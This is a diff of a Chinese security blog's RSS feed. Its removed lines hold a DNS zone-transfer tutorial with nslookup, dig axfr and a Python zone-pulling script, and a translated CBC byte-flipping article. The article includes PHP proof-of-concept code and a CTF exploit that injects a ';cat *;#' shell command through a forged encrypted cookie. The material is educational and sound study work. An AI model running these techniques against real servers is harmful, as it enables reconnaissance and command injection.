@@ -1,682 +1,101 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Gone with the code</title>
-    <description>Really cool blog about ... something</description>
-    <link></link>
-    <atom:link href="feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Wed, 02 Sep 2015 15:11:45 +0800</pubDate>
-    <lastBuildDate>Wed, 02 Sep 2015 15:11:45 +0800</lastBuildDate>
-    <generator>Jekyll v2.5.3</generator>
+    <title>Larryxi's blog - Articles</title>
+    <description>Larryxi's blog,learn security everyday.
+</description>
+    <link>
+    </link>
     
+      
+      <item>
+        <title>不插电 · WooYun Puzzle#3 Write up</title>
+        
+          <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 前言&lt;/h1&gt;
+
+</description>
+        
+        <pubDate>Tue, 28 Jun 2016 20:00:00 +0800</pubDate>
+        <link>
+        /wooyun-pluzze-3-write-up.html</link>
+        <guid isPermaLink="true">/wooyun-pluzze-3-write-up.html</guid>
+      </item>
+      
+    
+      
+      <item>
+        <title>TFTP反射放大攻击浅析</title>
+        
+          <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 前言&lt;/h1&gt;
+
+</description>
+        
+        <pubDate>Wed, 23 Mar 2016 18:30:00 +0800</pubDate>
+        <link>
+        /tftp-reflection-and-amplification-attack.html</link>
+        <guid isPermaLink="true">/tftp-reflection-and-amplification-attack.html</guid>
+      </item>
+      
+    
+      
+      <item>
+        <title>Python远控Pupy使用帮助</title>
+        
+          <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 前言&lt;/h1&gt;
+
+</description>
+        
+        <pubDate>Fri, 09 Oct 2015 03:00:00 +0800</pubDate>
+        <link>
+        /pupy-first-touch-101.html</link>
+        <guid isPermaLink="true">/pupy-first-touch-101.html</guid>
+      </item>
+      
+    
+      
       <item>
         <title>DNS域传送漏洞学习总结</title>
-        <description>&lt;h1 id=&quot;x01-&quot;&gt;0x01 前言&lt;/h1&gt;
-
-&lt;p&gt;本文是关于DNS域传送漏洞的学习与总结。&lt;/p&gt;
-
-&lt;p&gt;在&lt;a href=&quot;http://www.hackcto.com/post/2013-01-15/40047740289&quot;&gt;《安全参考》&lt;/a&gt;第一期中有：区域传送操作指的是一台后备服务器使用来自主服务器的数据刷新自己的 zone 数据库。这为运行中的 DNS 服务提供了一定的冗余度,其目的是为了防止主域名服务器因意外故障变得不可用时影响到全局。一般来说,DNS区域传送操作只在网络里真的有后备域名 DNS 服务器时才有必要执行,但许多 DNS 服务器却被错误地配置成&lt;strong&gt;只要有人发出请求&lt;/strong&gt;,就会向对方提供一个 zone 数据库的&lt;strong&gt;拷贝&lt;/strong&gt;。如果所提供的信息只是与连到因特网上且具备有效主机名的系统相关,那么这种错误配置不一定是坏事,尽管这使得攻击者发现潜在目标要容易得多。真正的问题发生在一个单位没有使用公用/私用 DNS 机制来分割外部公用 DNS 信息和内部私用 DNS 信息的时候,此时内部主机名和 IP 地址都暴露给了攻击者。把内部 IP 地址信息提供给因特网上不受信任的用户,就像是把一个单位的内部网络完整蓝图或导航图奉送给了别人。对系统管理员来说,允许不受信任的因特网用户执行 DNS 区域传送(&lt;code&gt;zone transfer&lt;/code&gt;)操作是后果最为严重的错误配置之一。&lt;/p&gt;
-
-&lt;p&gt;同时，在&lt;a href=&quot;http://wiki.wooyun.org/information:domain&quot;&gt;WooYun WiKi&lt;/a&gt;中也说道，利用DNS域传送漏洞可以有效地收集相关企业的子域名，收集信息也是渗透过程中很关键的一步。&lt;/p&gt;
-
-&lt;h1 id=&quot;x02-&quot;&gt;0x02 攻击方法&lt;/h1&gt;
-
-&lt;h2 id=&quot;windowsnslookup&quot;&gt;Windows下使用nslookup&lt;/h2&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;先设置查找类型为NS，查找出对应主机域的域名服务器。（或直接键入nslookup进入交互模式，再通过&lt;code&gt;set type=ns&lt;/code&gt;进行设置）&lt;/p&gt;
-
-    &lt;p&gt;&lt;code&gt;C:\&amp;gt;nslookup -qa=ns test.com&lt;/code&gt;&lt;/p&gt;
-
-    &lt;p&gt;会返回类似结果：&lt;/p&gt;
-
-    &lt;pre&gt;&lt;code&gt;    Server:  bogon
-    Address:  172.16.162.2           
-
-    Non-authoritative answer:
-    test.com        nameserver = ns66.worldnic.com
-    test.com        nameserver = ns65.worldnic.com
-&lt;/code&gt;&lt;/pre&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;使用nslookup命令进入交互模式，更改默认服务器为刚才查询的域名服务器&lt;/p&gt;
-
-    &lt;p&gt;&lt;code&gt;&amp;gt; server=ns66.worldnic.com&lt;/code&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;列出服务器上所有的DNS记录&lt;/p&gt;
-
-    &lt;p&gt;&lt;code&gt;&amp;gt; ls -d test.com&lt;/code&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;nslookup命令参考：&lt;/p&gt;
-
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;http://roclinux.cn/?p=2441&quot;&gt;《nslookup通往DNS的桥梁》-linux命令五分钟系列之三十三&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;nslookup进入交互模式后查看帮助：&lt;code&gt;&amp;gt;help&lt;/code&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h2 id=&quot;kalidig-dnsenum-dnswalk&quot;&gt;Kali下使用dig, dnsenum, dnswalk&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;使用&lt;code&gt;dig&lt;/code&gt;命令进行全量传输&lt;a href=&quot;http://www.cnblogs.com/cobbliu/archive/2013/03/24/2979521.html&quot;&gt;AXFR&lt;/a&gt;（从域名服务器从主域名服务器上请求zone文件）&lt;/p&gt;
-
-    &lt;pre&gt;&lt;code&gt;  dig @dnsserver name querytype
-  dig @192.168.5.6 test.com axfr
-&lt;/code&gt;&lt;/pre&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;使用&lt;code&gt;dnsenum&lt;/code&gt;获取测试对象全部的 DNS 解析记录信息&lt;/p&gt;
-
-    &lt;pre&gt;&lt;code&gt;  ./dnsenum.pl –enum test.com
-&lt;/code&gt;&lt;/pre&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;使用&lt;code&gt;dnswalk&lt;/code&gt;获取测试对象全部的 DNS 解析记录信息，注意域名后有一个点&lt;/p&gt;
-
-    &lt;pre&gt;&lt;code&gt;  ./dnswalk test.com.
-&lt;/code&gt;&lt;/pre&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;相关命令参考：&lt;/p&gt;
-
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;http://www.hackcto.com/post/2013-01-15/40047740289&quot;&gt;《安全参考》第一期&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;http://drops.wooyun.org/papers/64&quot;&gt;DNS域传送信息泄露&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;http://roclinux.cn/?p=2449&quot;&gt;《dig挖出DNS的秘密》-linux命令五分钟系列之三十四&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;x03-python&quot;&gt;0x03 攻击Python脚本分析&lt;/h2&gt;
-
-&lt;p&gt;一看Github上有，就拿来分析一下吧，&lt;a href=&quot;https://github.com/kaizoku/zonepull/blob/master/zonepull/zonepull.py&quot;&gt;kaizoku/zonepull&lt;/a&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python
-### Zonepuller
-## Attempts to get a domain transfer from the nameservers for the given domain
-## Requires dnspython http://www.dnspython.org/    
-
-import sys
-import socket
-import optparse
-try:
-    from dns import resolver, query, exception
-except ImportError:
-    print &quot;This script requires dnspython&quot;
-    print &quot;http://www.dnspython.org/&quot;
-    sys.exit(1)    
-
-
-
-class Transferrer(object):
-    def __init__(self, domain):
-        self.domain = domain
-        ## build list of nameservers
-        nss = resolver.query(domain, 'NS')
-        self.nameservers = [ str(ns) for ns in nss ]    
-
-
-    def transfer(self):
-        for ns in self.nameservers:
-            print &amp;gt;&amp;gt; sys.stderr, &quot;Querying %s&quot; % (ns,)
-            print &amp;gt;&amp;gt; sys.stderr, &quot;-&quot; * 50
-            z = self.query(ns)
-            print z
-            print &amp;gt;&amp;gt; sys.stderr, &quot;%s\n&quot; % (&quot;-&quot; * 50,)    
-
-
-    def query(self, ns):
-        nsaddr = self.resolve_a(ns)
-        try:
-            z = self.pull_zone(nsaddr)
-        except (exception.FormError, socket.error, EOFError):
-            print &amp;gt;&amp;gt; sys.stderr, &quot;AXFR failed\n&quot;
-            return None
-        else:
-            return z    
-
-
-    def resolve_a(self, name):
-        &quot;&quot;&quot;Pulls down an A record for a name&quot;&quot;&quot;
-        nsres = resolver.query(name, 'A')
-        return str(nsres[0])    
-
-
-    def pull_zone(self, nameserver):
-        &quot;&quot;&quot;Sends the domain transfer request&quot;&quot;&quot;
-        q = query.xfr(nameserver, self.domain, relativize=False, timeout=2)
-        zone = &quot;&quot;   ## janky, but this library returns
-        for m in q: ## an empty generator on timeout
-            zone += str(m)
-        if not zone:
-            raise EOFError
-        return zone    
-
-
-def main():
-    parser = optparse.OptionParser(usage=&quot;%prog &amp;lt;domain&amp;gt;&quot;, version=&quot;%prog 0.1&quot;)
-    options, args = parser.parse_args()
-    if not args:
-        parser.error(&quot;Must include at least one domain to transfer&quot;)    
-
-    for dom in args:
-        t = Transferrer(dom)
-        t.transfer()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;section&quot;&gt;分析：&lt;/h3&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;程序先尝试导入dns，没有安装dnspython则退出&lt;/li&gt;
-  &lt;li&gt;定义Transferrer()类来完成主要的域传送检测，先使用&lt;code&gt;resolver.query(domain, 'NS')&lt;/code&gt;方法查询对应域名的NS记录，并将其作为域名服务器查询其A记录，最后使用&lt;code&gt;query.xfr(nameserver, self.domain, relativize=False, timeout=2)&lt;/code&gt;尝试进行域传送&lt;/li&gt;
-  &lt;li&gt;main()函数主要对命令行传入的域名进行单线程串行检测是否存在DNS域传送&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;tips&quot;&gt;Tips：&lt;/h3&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;code&gt;print &amp;gt;&amp;gt; sys.stderr, &quot;Message&quot;&lt;/code&gt;可将信息重定向输出到标准错误输出当中&lt;/li&gt;
-  &lt;li&gt;&lt;code&gt;parser.error(&quot;Message&quot;)&lt;/code&gt;可用于选项解析错误提示&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;x04-&quot;&gt;0x04 防御方法&lt;/h2&gt;
-
-&lt;p&gt;在相应的zone、options中添加allow-transfer限制，具体见&lt;a href=&quot;http://wiki.wooyun.org/doku.php?id=server:zone-transfer&quot;&gt;DNS 域传送漏洞&lt;/a&gt;。这里还存在的&lt;strong&gt;问题&lt;/strong&gt;是：未对DNS服务和DNS服务器深入了解，攻击也没有重现，还有待深入学习，而且DNS的问题也不止这些，&lt;a href=&quot;http://www.cnblogs.com/cobbliu/archive/2013/03/24/2979521.html&quot;&gt;推荐看看&lt;/a&gt;&lt;/p&gt;
+        
+          <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 前言&lt;/h1&gt;
 
 </description>
+        
         <pubDate>Wed, 02 Sep 2015 21:30:00 +0800</pubDate>
-        <link>/studying/2015/09/02/DNS-zone-transfer-studying.html</link>
-        <guid isPermaLink="true">/studying/2015/09/02/DNS-zone-transfer-studying.html</guid>
-        
-        
-        <category>studying</category>
-        
+        <link>
+        /DNS-zone-transfer-studying.html</link>
+        <guid isPermaLink="true">/DNS-zone-transfer-studying.html</guid>
       </item>
+      
     
+      
       <item>
         <title>CBC字节翻转攻击-101Approach</title>
-        <description>&lt;p&gt;##0x00 译者前言##&lt;/p&gt;
-
-&lt;p&gt;本文翻译自：http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/&lt;br /&gt;
-drops里的相关主题文章：&lt;a href=&quot;http://drops.wooyun.org/tips/4975&quot;&gt;使用CBC比特反转攻击绕过加密的会话令牌&lt;/a&gt;&lt;br /&gt;
-缘起是糖果出的一道题，看到原文作者对这一问题阐述的较为详细，虽然时间有些久远，但翻译一下可与诸君学习一下思考问题的方法。&lt;/p&gt;
-
-&lt;p&gt;##0x01 相关介绍##&lt;/p&gt;
-
-&lt;p&gt;此攻击方法的精髓在于：&lt;strong&gt;通过损坏密文字节来改变明文字节&lt;/strong&gt;。（注：借助CBC内部的模式）借由此可以绕过过滤器，或者改变用户权限提升至管理员，又或者改变应用程序预期明文以尽猥琐之事。&lt;/p&gt;
-
-&lt;p&gt;首先让我们看看CBC是如何工作的，（作者很懒所以）更多细节你可以看这里：&lt;a href=&quot;http://en.wikipedia.org/wiki/Block_cipher_mode_of_operation&quot;&gt;wiki&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;在这里只是解释一下关于攻击必须要理解的部分。（即：一图胜千言）&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;加密过程&lt;/strong&gt;&lt;br /&gt;
-&lt;img src=&quot;/assets/images/20150808/Encryption.png&quot; alt=&quot;Encryption&quot; /&gt;&lt;br /&gt;
-&lt;strong&gt;Plaintext&lt;/strong&gt;：待加密的数据。&lt;br /&gt;
-&lt;strong&gt;IV&lt;/strong&gt;：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。&lt;br /&gt;
-&lt;strong&gt;Key&lt;/strong&gt;：被一些如AES的对称加密算法使用。&lt;br /&gt;
-&lt;strong&gt;Ciphertext&lt;/strong&gt;：加密后的数据。&lt;/p&gt;
-
-&lt;p&gt;在这里重要的一点是，CBC工作于一个固定长度的比特组，将其称之为&lt;em&gt;块&lt;/em&gt;。在本文中，我们将使用包含16字节的块。&lt;/p&gt;
-
-&lt;p&gt;因为作者讨厌高数（和译者一样），所以作者造了一些自己的公式（方便记忆）：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;em&gt;Ciphertext-0 = Encrypt(Plaintext XOR IV)&lt;/em&gt;—只用于第一个组块&lt;/li&gt;
-  &lt;li&gt;&lt;em&gt;Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)&lt;/em&gt;—用于第二及剩下的组块&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;注意：正如你所见，&lt;strong&gt;前一块的密文用来产生后一块的密文&lt;/strong&gt;。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Decryption Process&lt;/strong&gt;&lt;br /&gt;
-&lt;img src=&quot;/assets/images/20150808/Decryption.png&quot; alt=&quot;Decryption&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;em&gt;Plaintext-0 = Decrypt(Ciphertext) XOR IV&lt;/em&gt;—只用于第一个组块&lt;/li&gt;
-  &lt;li&gt;&lt;em&gt;Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1&lt;/em&gt;—用于第二及剩下的组块&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;注意：&lt;strong&gt;&lt;em&gt;Ciphertext-N-1&lt;/em&gt;（密文-N-1）是用来产生下一块明文&lt;/strong&gt;；这就是字节翻转攻击开始发挥作用的地方。如果我们改变&lt;em&gt;Ciphertext-N-1&lt;/em&gt;（密文-N-1）的一个字节，然后与下一个解密后的组块异或，我们就可以得到一个不同的明文了！&lt;strong&gt;You got it?&lt;/strong&gt;别担心，下面我们将看到一个详细的例子。与此同时，下面的这张图也可以很好地说明这种攻击：&lt;br /&gt;
-&lt;img src=&quot;/assets/images/20150808/attack.jpg&quot; alt=&quot;attack&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;##0x02 一个例子（CBC Blocks of 16 bytes）##&lt;/p&gt;
-
-&lt;p&gt;比方说，我们有这样的明文序列：&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;a:2:{s:4:&quot;name&quot;;s:6:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo 'Hello sdsdsd!'&quot;;}&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;我们的目标是将“&lt;code&gt;s:6&lt;/code&gt;”当中的数字6转换成数字“7”。我们需要做的第一件事就是把明文分成16个字节的块：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Block 1:&lt;code&gt;a:2:{s:4:&quot;name&quot;;&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Block 2:&lt;code&gt;s:6:&quot;sdsdsd&quot;;s:8&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Block 3:&lt;code&gt;:&quot;greeting&quot;;s:20&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Block 4:&lt;code&gt;:&quot;echo 'Hello sd&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Block 5:&lt;code&gt;sdsd!'&quot;;}&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;因此，我们的目标字符位于块2，这意味着我们需要改变块1的密文来改变第二块的明文。&lt;/p&gt;
-
-&lt;p&gt;有一条经验法则是（注：结合上面的说明图可以得到），你在密文中改变的字节，&lt;strong&gt;只&lt;/strong&gt;会影响到在下一明文当中，具有相同偏移量的字节。所以我们目标的偏移量是2：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;[0] = s&lt;/li&gt;
-  &lt;li&gt;[1] = :&lt;/li&gt;
-  &lt;li&gt;[2] =6&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;因此我们要改变在第一个密文块当中，偏移量是2的字节。正如你在下面的代码当中看到的，在第2行我们得到了整个数据的密文，然后在第3行中，我们改变块1中偏移量为2的字节，最后我们再调用解密函数。&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;&lt;code&gt;$v = &quot;a:2:{s:4:&quot;name&quot;;s:6:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo 'Hello sdsdsd!'&quot;;}&quot;;&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;code&gt;$enc = @encrypt($v);&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;code&gt;$enc[2] = chr(ord($enc[2]) ^ ord(&quot;6&quot;) ^ ord (&quot;7&quot;));&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;code&gt;$b = @decrypt($enc);&lt;/code&gt;&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;运行这段代码后，我们可以将数字6变为7：&lt;br /&gt;
-&lt;img src=&quot;/assets/images/20150808/pic1.png&quot; alt=&quot;pic1&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;但是我们在第3行中，是如何改变字节成为我们想要的值呢？&lt;/p&gt;
-
-&lt;p&gt;基于上述的解密过程，我们知道有，&lt;em&gt;A = Decrypt(Ciphertext)&lt;/em&gt;与&lt;em&gt;B = Ciphertext-N-1&lt;/em&gt;异或后最终得到&lt;em&gt;C = 6&lt;/em&gt;。等价于：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;C = A XOR B
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;所以，我们唯一不知道的值就是A（注：对于B，C来说）（&lt;em&gt;block cipher decryption&lt;/em&gt;）;借由XOR，我们可以很轻易地得到A的值：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;A = B XOR C
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;最后，A XOR B XOR C等于0。有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，就像这样：&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;A XOR B XOR C XOR &quot;7&quot; &lt;/code&gt;会在块2的明文当中，偏移量为2的字节处得到7。&lt;/p&gt;
-
-&lt;p&gt;下面是相关原理实现的PHP源代码：&lt;/p&gt;
-
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;define(&amp;#39;MY_AES_KEY&amp;#39;, &amp;quot;abcdef0123456789&amp;quot;);&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;    function aes($data, $encrypt) {&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        $aes = mcrypt_module_open(MCRYPT_RIJNDAEL_128, &amp;#39;&amp;#39;, MCRYPT_MODE_CBC, &amp;#39;&amp;#39;);&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        $iv = &amp;quot;1234567891234567&amp;quot;;&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        mcrypt_generic_init($aes, MY_AES_KEY, $iv);&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        return $encrypt ? mcrypt_generic($aes,$data) : mdecrypt_generic($aes,$data);&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;    }&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;    define(&amp;#39;MY_MAC_LEN&amp;#39;, 40);&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;    function encrypt($data) {&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        return aes($data, true);&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;    }&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;    function decrypt($data) {&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        $data = rtrim(aes($data, false), &amp;quot;\0&amp;quot;);&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        return $data;&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;    }&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;    $v = &amp;quot;a:2:{s:4:\&amp;quot;name\&amp;quot;;s:6:\&amp;quot;sdsdsd\&amp;quot;;s:8:\&amp;quot;greeting\&amp;quot;;s:20:\&amp;quot;echo &amp;#39;Hello sdsdsd!&amp;#39;\&amp;quot;;}&amp;quot;;&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;    echo &amp;quot;Plaintext before attack: $v\n&amp;quot;;&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;    $b = array();&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;    $enc = array();&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;    $enc = @encrypt($v);&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;    $enc[2] =  chr(ord($enc[2]) ^ ord(&amp;quot;6&amp;quot;) ^ ord (&amp;quot;7&amp;quot;));&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;    $b = @decrypt($enc);&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;    echo &amp;quot;Plaintext AFTER attack : $b\n&amp;quot;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;p&gt;##0x03 一个练习##&lt;/p&gt;
-
-&lt;p&gt;光说不练假把式，接下来作者举了一个他参加过的CTF中的一道题目的例子（更多详情可以参阅最后的相关参考链接），然后阐述了他是怎样在最后几步中打破CBC的。&lt;/p&gt;
-
-&lt;p&gt;下面提供了这个练习当中很重要的一部分源码：&lt;br /&gt;
-&lt;img src=&quot;/assets/images/20150808/pic2.png&quot; alt=&quot;pic2&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;其中，你在POST提交参数”name”的任何文本值之后，应用程序则会对应输出”Hello”加上最后提交的文本。但是有两件事情发生在消息打印之前：&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;POST参数”name”值被PHP函数escapeshellarg()过滤（转换单引号，防止恶意命令注入），然后将其存储在Array-&amp;gt;greeting当中，最后加密该值来产生cookie。&lt;/li&gt;
-  &lt;li&gt;Array-&amp;gt;greeting当中的内容被PHP函数passthru()执行。&lt;/li&gt;
-  &lt;li&gt;最后，在页面被访问的任何时间中，如果cookie已经存在，它会被解密，它的内容会通过passthru()函数执行。如前节所述，在这里CBC攻击会给我们一个不同的明文。&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;然后作者构造了一个POST”name”的值来注入字符串：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;name = 'X' + ';cat *;#a'
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;首先作者添加了一个字符”X”，通过CBC翻转攻击将其替换成一个单引号，然后&lt;code&gt;;cat *;&lt;/code&gt;命令将被执行，最后的&lt;code&gt;#&lt;/code&gt;是用来注释，确保函数escapeshellarg()插入的单引号不会引起其他问题；因此我们的命令就被成功执行啦。&lt;/p&gt;
-
-&lt;p&gt;在计算好之前的密码块中，要被改变的字节的确切偏移量（51）后，作者通过下面的代码来注入单引号：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;pos = 51;
-val = chr(ord('X') ^ ord(&quot;'&quot;) ^ ord(cookie[pos]))
-exploit = cookie[0:pos] + val + cookie[pos + 1:]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;然后作者通过改变cookie（因为其具有全部的密文），得到以下结果：&lt;br /&gt;
-&lt;img src=&quot;/assets/images/20150808/pic3.png&quot; alt=&quot;pic3&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;首先，因为我们改变了第一块，所以在第二块中，黄色标记的”X”被成功替换为单引号，它被认为是多余插入（绿色），导致在unserialize()处理数据时产生一个错误（红色），因此应用程序甚至都没有去尝试执行注入了。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;如何完善&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;我们需要使我们的注入数据有效，那么我们在第一块中得到的额外数据，就不能在反序列化的过程中造成任何问题（unserialize()）。一种方法是在我们的恶意命令中填充字母字符。因此我们尝试在注入字符串前后填充多个’z’：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;name = 'z'*17 + 'X' + ';cat *;#' + 'z'*16
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;在发送上述字符串后，unserialize()并没有报错，并且我们的shell命令成功执行！！！&lt;/p&gt;
-
-&lt;p&gt;##0x04 相关参考##&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;CRYPTO #2: http://blog.gdssecurity.com/labs/tag/crypto&lt;/li&gt;
-  &lt;li&gt;http://codezen.fr/2013/08/05/ebctf-2013-web400-cryptoaescbchmac-write-up/&lt;/li&gt;
-  &lt;li&gt;http://hardc0de.ru/2013/08/04/ebctf-web400/&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;##0x05 附录代码##&lt;/p&gt;
-
-&lt;p&gt;下面是上面练习当中的PHP源码及exp：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;PHP code:&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;ini_set(&amp;#39;display_errors&amp;#39;,1);&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        error_reporting(E_ALL);&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;         &lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        define(&amp;#39;MY_AES_KEY&amp;#39;, &amp;quot;abcdef0123456789&amp;quot;);&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        define(&amp;#39;MY_HMAC_KEY&amp;#39;,&amp;quot;1234567890123456&amp;quot; );&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        #define(&amp;quot;FLAG&amp;quot;,&amp;quot;CENSORED&amp;quot;);&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;         &lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        function aes($data, $encrypt) {&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;            $aes = mcrypt_module_open(MCRYPT_RIJNDAEL_128, &amp;#39;&amp;#39;, MCRYPT_MODE_CBC, &amp;#39;&amp;#39;);&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;            $iv = mcrypt_create_iv (mcrypt_enc_get_iv_size($aes), MCRYPT_RAND);&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;            $iv = &amp;quot;1234567891234567&amp;quot;;&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;            mcrypt_generic_init($aes, MY_AES_KEY, $iv);&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;            return $encrypt ? mcrypt_generic($aes, $data) : mdecrypt_generic($aes, $data);&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        }&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;         &lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        define(&amp;#39;MY_MAC_LEN&amp;#39;, 40);&lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;         &lt;/span&gt;
-&lt;span class=&quot;x&quot;&gt;        function hmac($data) {&lt;/span&gt;
